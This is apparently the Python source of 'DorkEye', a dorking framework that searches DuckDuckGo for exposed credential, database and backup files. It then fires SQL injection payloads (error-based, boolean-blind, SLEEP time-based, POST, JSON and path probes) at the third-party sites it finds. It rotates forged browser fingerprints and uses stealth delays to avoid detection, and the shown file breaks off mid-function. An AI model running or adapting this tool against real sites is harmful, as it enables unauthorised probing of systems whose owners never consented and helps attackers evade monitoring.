#!/usr/bin/env python3
"""
DorkEye v4.2.6 | Security Dorking Framework
Enhanced with real SQL injection detection, HTTP fingerprinting, and improved stealth
Author: xPloits3c | https://github.com/xPloits3c/DorkEye
"""

import os
import sys
import time
import json
import yaml
import random
import argparse
import hashlib
import difflib
import csv
import re
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Set, Tuple, Optional
from urllib.parse import urlparse, unquote, parse_qs, urlencode, quote
from collections import defaultdict
from dataclasses import dataclass
from enum import Enum

import requests
from requests.adapters import HTTPAdapter
from dork_generator import DorkGenerator
from urllib3.util.retry import Retry
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table
from rich.panel import Panel
from ddgs import DDGS
import socket
import getpass

console = Console()

ASCII_LOGO = """
     \n[bold yellow]  ___[/bold yellow]
 [bold yellow]__H__[/bold yellow]  [bold white]    xploits3c.github.io/DorkEye [/bold white]
 [bold yellow] [[/bold yellow][bold red],[/bold red][bold yellow]][/bold yellow]
 [bold yellow] [[/bold yellow][bold red])[/bold red][bold yellow]][/bold yellow]
 [bold yellow] [[/bold yellow][bold red];[/bold red][bold yellow]][/bold yellow][bold yellow]    DorkEye |[bold red] OSINT & Security Dorking Framework[/bold red][/bold yellow]
 [bold yellow] |_|[/bold yellow]  [bold white]                     v4.2.6[/bold white]
 [bold yellow]  V[/bold yellow]
    \n[bold red]Legal disclaimer:[/bold red][bold yellow] attacking targets without prior mutual consent is illegal.[/bold yellow]
 [bold red][!][/bold red][bold yellow] It is the end user's responsibility to obey all applicable local, state and federal laws.[/bold yellow]
"""
WELCOME_MESSAGES = [
    "Stay safe, {name}.",
    "Session initialized, {name}.",
    "Connected. Welcome back, {name}.",
    "Terminal ready, {name}.",
    "OSINT mode active, {name}.",
    "Curiosity leaves footprints.",
    "VPN is not invisibility.",
    "They log more than you think.",
    "Silence. Just data, {name}.",
    "Back online, {name}.",
    "Workspace loaded, {name}.",
    "Use isolated environments.",
    "Targets waiting, {name}.",
    "Query the noise, {name}.",
    "Burn what you touch.",
    "You are visible.",
    "No small talk. Just results, {name}.",
    "We don’t break things. We observe, {name}.",
    "Information wants to be found, {name}.",
    "Trust nothing. Verify everything, {name}.",
    "Stay invisible, {name}.",
    "Let’s see what they forgot to hide, {name}.",
]

WELCOME_COLORS = [
    "green",
    "bright_green",
    "yellow",
    "bright_yellow",
    "magenta",
    "bright_magenta",
    "blue",
    "bright_blue",
    "red",
    "bright_red",
    "white",
]

def get_user_name() -> str:
    try:
        return getpass.getuser()
    except Exception:
        try:
            return socket.gethostname()
        except Exception:
            return "friend"

def greet_user():
    name = get_user_name()
    message = random.choice(WELCOME_MESSAGES).format(name=name)
    color = random.choice(WELCOME_COLORS)
    console.print(f"[bold {color}]{message}[/bold {color}]\n")

class SQLiConfidence(Enum):
    """SQL Injection Confidence Levels"""
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class HTTPFingerprint:
    """HTTP Request Fingerprint for stealth"""
    browser: str
    os: str
    user_agent: str
    accept_language: str
    accept_encoding: str
    accept: str
    referer: str
    sec_fetch_dest: str
    sec_fetch_mode: str
    sec_fetch_site: str
    cache_control: str


def load_http_fingerprints() -> Dict:
    """Load HTTP fingerprints (legacy or advanced format)"""
    fingerprint_file = Path(__file__).parent / "http_fingerprints.json"

    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            data = json.load(f)

        if not isinstance(data, dict) or not data:
            raise ValueError("Fingerprint file is empty or invalid")

        if "fingerprints" in data:
            return {
                "_mode": "advanced",
                "_meta": data.get("_meta", {}),
                "fingerprints": data.get("fingerprints", {}),
                "language_profiles": data.get("language_profiles", {}),
                "common_headers": data.get("common_headers", {})
            }

        return {
            "_mode": "legacy",
            "fingerprints": data
        }

    except Exception as e:
        console.print(f"[yellow][!] Failed to load HTTP fingerprints: {e}[/yellow]")
        console.print("[yellow][!] HTTP fingerprinting will be disabled[/yellow]")
        return {"_mode": "disabled"}

def resolve_reference(value: str, common_headers: Dict) -> str:
    """Resolve @reference from common_headers"""
    if isinstance(value, str) and value.startswith("@"):
        key = value[1:]
        return common_headers.get(key, "")
    return value

def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
    """Choose and resolve Accept-Language"""
    profiles = fp_headers.get("accept_language_profiles")
    if not profiles:
        return ""

    profile = random.choice(profiles)
    return language_profiles.get(profile, "")

USER_AGENTS = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ]
}

DEFAULT_CONFIG = {
    "extensions": {
        "documents": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods"],
        "archives": [".zip", ".rar", ".tar", ".gz", ".7z", ".bz2"],
        "databases": [".sql", ".db", ".sqlite", ".mdb"],
        "backups": [".bak", ".backup", ".old", ".tmp"],
        "configs": [".conf", ".config", ".ini", ".yaml", ".yml", ".json", ".xml"],
        "scripts": [".php", ".asp", ".aspx", ".jsp", ".sh", ".bat", ".ps1"],
        "credentials": [".env", ".git", ".svn", ".htpasswd"]
    },
    "blacklist": [],
    "whitelist": [],
    "analyze_files": True,
    "max_file_size_check": 52428800,
    "sqli_detection": False,
    "stealth_mode": False,
    "user_agent_rotation": True,
    "http_fingerprinting": True,
    "request_timeout": 10,
    "max_retries": 3
}

class HTTPFingerprintRotator:
    """Manages realistic HTTP fingerprints for stealth"""

    def __init__(self):
        self.raw_fingerprints = load_http_fingerprints()
        self.fingerprints = self._build_fingerprints()
        self.current_index = 0
        self.current_fingerprint = None

    def _build_fingerprints(self) -> List[HTTPFingerprint]:
        fingerprints: List[HTTPFingerprint] = []

        mode = self.raw_fingerprints.get("_mode")

        if mode == "legacy":
            for fp_data in self.raw_fingerprints.get("fingerprints", {}).values():
                try:
                    fingerprints.append(
                        HTTPFingerprint(
                            browser=fp_data["browser"],
                            os=fp_data["os"],
                            user_agent=fp_data["user_agent"],
                            accept_language=fp_data["accept_language"],
                            accept_encoding=fp_data["accept_encoding"],
                            accept=fp_data["accept"],
                            referer="",
                            sec_fetch_dest=fp_data["sec_fetch_dest"],
                            sec_fetch_mode=fp_data["sec_fetch_mode"],
                            sec_fetch_site=fp_data["sec_fetch_site"],
                            cache_control=fp_data["cache_control"],
                        )
                    )
                except KeyError:
                    continue

            return fingerprints

        if mode == "advanced":
            language_profiles = self.raw_fingerprints.get("language_profiles", {})
            common_headers = self.raw_fingerprints.get("common_headers", {})
            fps = self.raw_fingerprints.get("fingerprints", {})

            for fp in fps.values():
                try:
                    headers = fp.get("headers", {})
                    sec_fetch = headers.get("sec_fetch", {})

                    accept = resolve_reference(headers.get("accept", ""), common_headers)
                    accept_encoding = resolve_reference(headers.get("accept_encoding", ""), common_headers)
                    cache_control = resolve_reference(headers.get("cache_control", ""), common_headers)
                    accept_language = resolve_accept_language(headers, language_profiles)

                    fingerprints.append(
                        HTTPFingerprint(
                            browser=fp.get("browser", ""),
                            os=fp.get("os", ""),
                            user_agent=fp.get("user_agent", ""),
                            accept_language=accept_language,
                            accept_encoding=accept_encoding,
                            accept=accept,
                            referer="",
                            sec_fetch_dest=sec_fetch.get("dest", "document"),
                            sec_fetch_mode=sec_fetch.get("mode", "navigate"),
                            sec_fetch_site=sec_fetch.get("site", "none"),
                            cache_control=cache_control,
                        )
                    )
                except Exception:
                    continue

        return fingerprints

    def get_random(self) -> Optional[HTTPFingerprint]:
        self.current_fingerprint = random.choice(self.fingerprints) if self.fingerprints else None
        return self.current_fingerprint

    def get_next(self) -> Optional[HTTPFingerprint]:
        if not self.fingerprints:
            return None
        self.current_fingerprint = self.fingerprints[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.fingerprints)
        return self.current_fingerprint

    def build_headers(self, referer: str = "") -> Dict[str, str]:
        if not self.current_fingerprint:
            return {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Connection": "keep-alive"
            }

        headers = {
            "User-Agent": self.current_fingerprint.user_agent,
            "Accept": self.current_fingerprint.accept,
            "Accept-Language": self.current_fingerprint.accept_language,
            "Accept-Encoding": self.current_fingerprint.accept_encoding,
            "Sec-Fetch-Dest": self.current_fingerprint.sec_fetch_dest,
            "Sec-Fetch-Mode": self.current_fingerprint.sec_fetch_mode,
            "Sec-Fetch-Site": self.current_fingerprint.sec_fetch_site,
            "Cache-Control": self.current_fingerprint.cache_control,
            "Pragma": "no-cache",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        if referer:
            headers["Referer"] = referer

        return headers

class SQLiDetector:
    """Advanced SQL Injection Detection with no false positives"""

    SQL_ERROR_SIGNATURES = {
        "mysql": [
            r"MySQL syntax.*error",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"mysql_num_rows",
            r"mysql_fetch"
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\. ",
            r"org\.postgresql"
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client",
            r"ODBC SQL Server Driver",
            r"MSSQL"
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"sqlite3\.OperationalError"
        ],
        "oracle": [
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"ORA-\d{5}"
        ],
        "generic": [
            r"Syntax error",
            r"Query syntax",
            r"SQL command",
            r"Unexpected token"
        ]
    }

    def __init__(self, stealth: bool = False, timeout: int = 10):
        self.stealth = stealth
        self.timeout = timeout
        self.fingerprint_rotator = HTTPFingerprintRotator()

    def has_query_params(self, url: str) -> bool:
        """Check if URL contains query parameters (modern SQLi detection entrypoint)"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            return bool(params)
        except Exception:
            return False

    def _extract_query_params(self, url: str) -> Dict[str, str]:
        """Extract and normalize query parameters"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        except Exception:
            return {}

    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
        """Get baseline response without injection"""
        try:
            fp = self.fingerprint_rotator.get_random()
            headers = self.fingerprint_rotator.build_headers()

            response = requests.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            return (
                response.status_code,
                response.text,
                len(response.text)
            )
        except Exception:
            return None

    def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
        """
        Lightweight probe to detect if parameter affects response.
        Uses similarity comparison instead of raw length to reduce false positives.
        """
        probe_payload = "1'"
        test_url = self._inject_payload(url, param_name, probe_payload)

        try:
            self.fingerprint_rotator.get_random()
            headers = self.fingerprint_rotator.build_headers()

            response = requests.get(
                test_url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            similarity = difflib.SequenceMatcher(
                None,
                baseline_content,
                response.text
            ).ratio()

            # If similarity drops below threshold → parameter affects output
            return similarity < 0.90

        except Exception:
            return False

    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """Test for Boolean-based blind SQLi"""
        result = {
            "method": "boolean_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence": []
        }

        payloads = [
            ("1' AND '1'='1", "true"),
            ("1' AND '1'='2", "false"),
            ("1 AND 1=1", "true"),
            ("1 AND 1=2", "false")
        ]

        true_responses = []
        false_responses = []

        for payload, payload_type in payloads:
            test_url = self._inject_payload(url, param_name, payload)

            try:
                fp = self.fingerprint_rotator.get_random()
                headers = self.fingerprint_rotator.build_headers()

                response = requests.get(
                    test_url,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )

                if payload_type == "true":
                    true_responses.append(len(response.text))
                else:
                    false_responses.append(len(response.text))

                if self.stealth:
                    time.sleep(random.uniform(1, 2))

            except Exception:
                pass

        if true_responses and false_responses:
            avg_true = sum(true_responses) / len(true_responses)
            avg_false = sum(false_responses) / len(false_responses)

            difference = abs(avg_true - avg_false)
            variation_true = max(true_responses) - min(true_responses) if true_responses else 0
            variation_false = max(false_responses) - min(false_responses) if false_responses else 0

            if difference > baseline_len * 0.15 and variation_true < baseline_len * 0.05 and variation_false < baseline_len * 0.05:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.MEDIUM.value
                result["evidence"].append(f"Boolean-based response differential detected (True: {avg_true:.0f}B, False: {avg_false:.0f}B)")

        return result

    def _test_error_based(self, url: str, param_name: str) -> Dict:
        """Test for Error-based SQLi"""
        result = {
            "method": "error_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence": []
        }

        payloads = [
            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)",
            "1' OR 1=1#",
            "1'; SELECT NULL#"
        ]

        for payload in payloads:
            test_url = self._inject_payload(url, param_name, payload)

            try:
                fp = self.fingerprint_rotator.get_random()
                headers = self.fingerprint_rotator.build_headers()

                response = requests.get(
                    test_url,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )

                for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            result["vulnerable"] = True
                            result["confidence"] = SQLiConfidence.HIGH.value
                            result["evidence"].append(f"{db_type.upper()} error detected: {pattern[:50]}")
                            return result

                if self.stealth:
                    time.sleep(random.uniform(1.5, 3))

            except Exception:
                pass

        return result

    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
        """Test for Time-based blind SQLi (minimal impact)"""
        result = {
            "method": "time_based_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence": []
        }

        payloads = [
            ("1' AND SLEEP(2) AND '1'='1", 2),
            ("1 AND SLEEP(2)", 2)
        ]

        for payload, expected_delay in payloads:
            test_url = self._inject_payload(url, param_name, payload)

            try:
                start_time = time.time()
                response = requests.get(
                    test_url,
                    headers=self.fingerprint_rotator.build_headers(),
                    timeout=self.timeout + 5,
                    verify=False,
                    allow_redirects=True
                )
                elapsed = time.time() - start_time

                if elapsed >= expected_delay * 0.8:
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(f"Time-based response delay detected ({elapsed:.1f}s)")
                    return result

            except requests.Timeout:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.MEDIUM.value
                result["evidence"].append("Request timeout on time-based payload")
                return result
            except Exception:
                pass

        return result

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Safely inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if param_name not in params:
            return url

        params[param_name] = [payload]

        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def test_sqli(self, url: str) -> Dict:
        """Comprehensive SQLi detection"""
        result = {
            "url": url,
            "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [],
            "tested": False,
            "message": ""
        }

        if not self.has_query_params(url):
            result["message"] = "No query parameters found"
            return result

        result["tested"] = True

        params = self._extract_query_params(url)
        if not params:
            result["message"] = "No query parameters found"
            return result

        baseline = self._get_baseline_response(url)
        if not baseline:
            result["message"] = "Could not establish baseline"
            return result

        _, baseline_content, baseline_len = baseline

        confidence_scores = []

        for param_name in params.keys():
            if self._probe_parameter(url, param_name, baseline_content):
                error_result = self._test_error_based(url, param_name)
                result["tests"].append(error_result)
                if error_result["vulnerable"]:
                    confidence_scores.append(3 if error_result["confidence"] == SQLiConfidence.HIGH.value else 2)

                if error_result["vulnerable"] and error_result["confidence"] == SQLiConfidence.HIGH.value:
                    result["vulnerable"] = True
                    result["overall_confidence"] = SQLiConfidence.HIGH.value
                    return result

                if not error_result["vulnerable"]:
                    bool_result = self._test_boolean_blind(url, param_name, baseline_len)
                    result["tests"].append(bool_result)
                    if bool_result["vulnerable"]:
                        confidence_scores.append(2)

                time_based_result = self._test_time_based_blind(url, param_name)
                result["tests"].append(time_based_result)
                if time_based_result.get("vulnerable", False):
                    confidence_scores.append(3 if time_based_result["confidence"] == SQLiConfidence.HIGH.value else 2)

                if self.stealth:
                    time.sleep(random.uniform(2, 4))

        if confidence_scores:
            avg_score = sum(confidence_scores) / len(confidence_scores)
            if avg_score >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
                result["vulnerable"] = True
            elif avg_score >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
                result["vulnerable"] = True

        result["message"] = f"Tested {len(params)} parameter(s)"

        return result

    def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
        """Test for SQL injection on POST requests (application/x-www-form-urlencoded)"""

        result = {
            "url": url,
            "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [],
            "tested": False,
            "message": ""
        }

        # Validate presence of POST parameters before attempting injection tests
        if not post_data:
            result["message"] = "No POST parameters found"
            return result

        result["tested"] = True

        # Establish baseline response (GET baseline, minimal impact)
        baseline = self._get_baseline_response(url)
        if not baseline:
            result["message"] = "Could not establish baseline"
            return result

        _, baseline_content, baseline_len = baseline
        confidence_scores = []

        # BODY-based SQLi testing only (no URL injection)
        for param_name in post_data.keys():

            payload_dict = post_data.copy()
            payload_dict[param_name] = str(post_data[param_name]) + "'"

            try:
                self.fingerprint_rotator.get_random()
                headers = self.fingerprint_rotator.build_headers()

                response = requests.post(
                    url,
                    data=payload_dict,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )

                # Check for SQL error signatures
                for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            result["vulnerable"] = True
                            result["tests"].append({
                                "method": "post_error_based",
                                "parameter": param_name,
                                "db": db_type,
                                "evidence": pattern
                            })
                            confidence_scores.append(3)
                            break

                # Fallback generic error check (low confidence)
                if not result["vulnerable"]:
                    if "sql" in response.text.lower() or "syntax" in response.text.lower():
                        confidence_scores.append(2)

            except Exception:
                pass

            if self.stealth:
                time.sleep(random.uniform(2, 4))

        # Confidence aggregation
        if confidence_scores:
            avg_score = sum(confidence_scores) / len(confidence_scores)

            if avg_score >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
                result["vulnerable"] = True
            elif avg_score >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
                result["vulnerable"] = True

        result["message"] = f"Tested {len(post_data)} POST parameter(s)"

        return result

    def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
        """Test for SQL injection in JSON POST requests"""
        result = {
            "url": url,
            "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [],
            "tested": False,
            "message": ""
        }

        if not json_data:
            result["message"] = "No JSON parameters found"
            return result


        result["tested"] = True

        baseline = self._get_baseline_response(url)
        if not baseline:
            result["message"] = "Could not establish baseline"
            return result

        _, _, baseline_len = baseline
        
        confidence_scores = []

        for key in json_data.keys():
            payload_dict = json_data.copy()
            payload = payload_dict[key] + "'"
            payload_dict[key] = payload
            response = requests.post(url, json=payload_dict, timeout=self.timeout, verify=False)

            if response.status_code == 200 and 'error' in response.text.lower():
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.HIGH.value
                confidence_scores.append(3)

            if self.stealth:
                time.sleep(random.uniform(2, 4))

        if confidence_scores:
            avg_score = sum(confidence_scores) / len(confidence_scores)
            if avg_score >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
                result["vulnerable"] = True
            elif avg_score >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
                result["vulnerable"] = True

        result["message"] = "JSON injection test completed"

        return result

    def test_path_based_sqli(self, url: str) -> Dict:
        """Check for path-based SQL injection"""
        result = {
            "method": "path_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence": []
        }

        parsed = urlparse(url)
        path = parsed.path

        if re.search(r'/\d+$', path) or re.search(r'/\w+$', path):
            test_url = f"{url}'"
            try:
                response = requests.get(test_url, headers=self.fingerprint_rotator.build_headers(), timeout=self.timeout, verify=False)
                if response.status_code == 200 and 'error' in response.text.lower():
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(f"Path-based SQLi detected in {url}")
            except Exception:
                pass

        return result

class UserAgentRotator:
    """Rotates user agents for better results"""

    def __init__(self):
        self.agents = []
        for agents_list in USER_AGENTS.values():
            self.agents.extend(agents_list)
        self.current_index = 0

    def get_random(self) -> str:
        """Get random user agent"""
        return random.choice(self.agents)

    def get_next(self) -> str:
        """Get next user agent in rotation"""
        agent = self.agents[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.agents)
        return agent

class FileAnalyzer:
    """Analyzes URLs and files found during dorking"""

    def __init__(self, config: Dict, ua_rotator: UserAgentRotator, fp_rotator: HTTPFingerprintRotator):
        self.config = config
        self.ua_rotator = ua_rotator
        self.fp_rotator = fp_rotator
        self.extension_map = self._flatten_extensions()
        self.sqli_detector = SQLiDetector(
            stealth=config.get("stealth_mode", False),
            timeout=config.get("request_timeout", 10)
        )
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        """Create requests session with retry strategy"""
        session = requests.Session()
        retry_strategy = Retry(
            total=self.config.get("max_retries", 3),
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "HEAD"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _flatten_extensions(self) -> Dict[str, str]:
        """Create a map of extension -> category"""
        ext_map = {}
        for category, extensions in self.config["extensions"].items():
            for ext in extensions:
                ext_map[ext.lower()] = category
        return ext_map

    def get_file_extension(self, url: str) -> str:
        """Extract file extension from URL"""
        try:
            parsed = urlparse(url)
            path = unquote(parsed.path)
            ext = os.path.splitext(path)[1].lower()
            return ext if ext else ""
        except Exception:
            return ""

    def categorize_url(self, url: str) -> str:
        """Categorize URL based on extension"""
        ext = self.get_file_extension(url)
        if not ext:
            return "webpage"
        return self.extension_map.get(ext, "other")

    def is_blacklisted(self, url: str) -> bool:
        """Check if URL extension is blacklisted"""
        if not self.config["blacklist"]:
            return False
        ext = self.get_file_extension(url)
        return ext in self.config["blacklist"]

    def is_whitelisted(self, url: str) -> bool:
        """Check if URL extension is whitelisted"""
        if not self.config["whitelist"]:
            return True
        ext = self.get_file_extension(url)
        return ext in self.config["whitelist"]

    def analyze_file(self, url: str) -> Dict:
        """Analyze file metadata (headers only, no download)"""
        result = {
            "url": url,
            "extension": self.get_file_extension(url),
            "category": self.categorize_url(url),
            "size": None,
            "content_type": None,
            "accessible": False,
            "status_code": None
        }

        try:
            if self.config.get("http_fingerprinting", True):
                # Fingerprinting has priority and already includes UA
                self.fp_rotator.get_random()
                headers = self.fp_rotator.build_headers()
            else:
                if self.config.get("user_agent_rotation", True):
                    headers = {"User-Agent": self.ua_rotator.get_random()}
                else:
                    # Fixed User-Agent (first one in list)
                    headers = {"User-Agent": self.ua_rotator.agents[0]}

            response = self.session.head(
                url,
                timeout=self.config.get("request_timeout", 10),
                allow_redirects=True,
                headers=headers,
                verify=False
            )

            result["status_code"] = response.status_code
            result["accessible"] = response.status_code == 200

            if "content-length" in response.headers:
                try:
                    result["size"] = int(response.headers["content-length"])
                except Exception:
                    pass

            if "content-type" in response.headers:
                result["content_type"] = response.headers["content-type"]

        except Exception as e:
            result["error"] = str(e)

        return result

    def check_sqli(self, url: str) -> Dict:
        """Check for SQL injection vulnerability"""
        if not self.config.get("sqli_detection", False):
            return {"tested": False}

        return self.sqli_detector.test_sqli(url)

class DorkEyeEnhanced:
    """Main DorkEye class with enhanced functionality"""

    def __init__(self, config: Dict, output_file: str = None):
        self.config = config
        self.output_file = output_file
        self.ua_rotator = UserAgentRotator()
        self.fp_rotator = HTTPFingerprintRotator()
        self.analyzer = FileAnalyzer(config, self.ua_rotator, self.fp_rotator)
        self.results: List[Dict] = []
        self.stats = defaultdict(int)
        self.url_hashes: Set[str] = set()
        self.start_time = time.time()

    def _hash_url(self, url: str) -> str:
        """Create hash of URL for deduplication"""
        return hashlib.md5(url.encode()).hexdigest()

    def is_duplicate(self, url: str) -> bool:
        """Check if URL is duplicate"""
        url_hash = self._hash_url(url)
        if url_hash in self.url_hashes:
            return True
        self.url_hashes.add(url_hash)
        return False

    def process_dorks(self, dork_input: str) -> List[str]:
        """Process dork input (file or single dork)"""
        if os.path.isfile(dork_input):
            with open(dork_input, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return [dork_input]

    def search_dork(self, dork: str, count: int) -> List[Dict]:
        """Search single dork with improved result gathering"""
        console.print(f"\n[bold green][*] Searching dork:[/bold green] {dork}")
        results = []
        total_fetched = 0
        max_attempts = 3

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Searching DuckDuckGo...", total=count)

            for attempt in range(max_attempts):
                try:
                    ddgs = DDGS()

                    batch_size = min(50, count - total_fetched)
                    if batch_size <= 0:
                        break

                    search_results = ddgs.text(dork, max_results=batch_size)

                    for r in search_results:
                        url = r.get("href") or r.get("url")
                        if not url:
                            continue

                        if self.analyzer.is_blacklisted(url):
                            self.stats["blacklisted"] += 1
                            continue

                        if not self.analyzer.is_whitelisted(url):
                            self.stats["not_whitelisted"] += 1
                            continue

                        if self.is_duplicate(url):
                            self.stats["duplicates"] += 1
                            continue

                        result = {
                            "url": url,
                            "title": r.get("title", ""),
                            "snippet": r.get("body", ""),
                            "dork": dork,
                            "timestamp": datetime.now().isoformat(),
                            "extension": self.analyzer.get_file_extension(url),
                            "category": self.analyzer.categorize_url(url)
                        }

                        results.append(result)
                        total_fetched += 1
                        self.stats["total_found"] += 1
                        self.stats[f"category_{result['category']}"] += 1

                        progress.update(task, completed=min(total_fetched, count))

                        if total_fetched >= count:
                            break

                    if total_fetched >= count:
                        break

                    if attempt < max_attempts - 1 and total_fetched < count:
                        if self.config.get("stealth_mode", False):
                            delay = random.uniform(5, 8)
                        else:
                            delay = random.uniform(2, 4)
                        time.sleep(delay)

                except Exception as e:
                    console.print(f"[yellow][!] Attempt {attempt + 1} failed: {str(e)}[/yellow]")
                    if attempt < max_attempts - 1:
                        time.sleep(2)
                    continue

        console.print(f"[bold blue][+] Found {len(results)} unique results for this dork[/bold blue]")
        return results

    def analyze_results(self, results: List[Dict]) -> List[Dict]:
        """Analyze files and check for SQLi in results"""
        if not self.config.get("analyze_files", False) and not self.config.get("sqli_detection", False):
            return results

        console.print("\n[bold yellow][*] Analyzing results...[/bold yellow]")

        files_to_analyze = [r for r in results if r["category"] != "webpage"]
        urls_to_test_sqli = [r for r in results if self.config.get("sqli_detection", False)]

        with Progress(console=console) as progress:
            if self.config.get("analyze_files", False) and files_to_analyze:
                task1 = progress.add_task("[cyan]Analyzing files...", total=len(files_to_analyze))
                for result in files_to_analyze:
                    analysis = self.analyzer.analyze_file(result["url"])
                    result.update({
                        "file_size": analysis["size"],
                        "content_type": analysis["content_type"],
                        "accessible": analysis["accessible"],
                        "status_code": analysis["status_code"]
                    })
                    progress.advance(task1)

                    if self.config.get("stealth_mode", False):
                        time.sleep(random.uniform(1, 2))
                    else:
                        time.sleep(0.5)

            if self.config.get("sqli_detection", False) and urls_to_test_sqli:
                task2 = progress.add_task("[cyan]Testing for SQLi...", total=len(urls_to_test_sqli))
                for result in urls_to_test_sqli:
                    sqli_result = self.analyzer.check_sqli(result["url"])
                    result["sqli_test"] = sqli_result

                    if sqli_result.get("vulnerable", False):
                        self.stats["sqli_vulnerable"] += 1
                        confidence = sqli_result.get("overall_confidence", "unknown")
                        console.print(f"[bold red][!] Potential SQLi found ({confidence}): {result['url']}[/bold red]")

                    progress.advance(task2)

                    if self.config.get("stealth_mode", False):
                        time.sleep(random.uniform(3, 6))

